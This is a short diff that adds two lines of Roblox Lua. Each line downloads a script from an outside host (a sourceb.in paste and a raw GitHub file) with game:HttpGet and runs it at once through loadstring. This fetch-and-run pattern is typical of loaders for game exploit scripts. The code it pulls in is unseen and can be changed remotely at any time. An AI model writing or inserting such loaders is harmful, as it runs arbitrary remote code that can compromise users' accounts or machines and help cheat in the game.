@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/StXSZmYMlL/0", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zynxrm/SourceLua/refs/heads/main/gyatt"))()
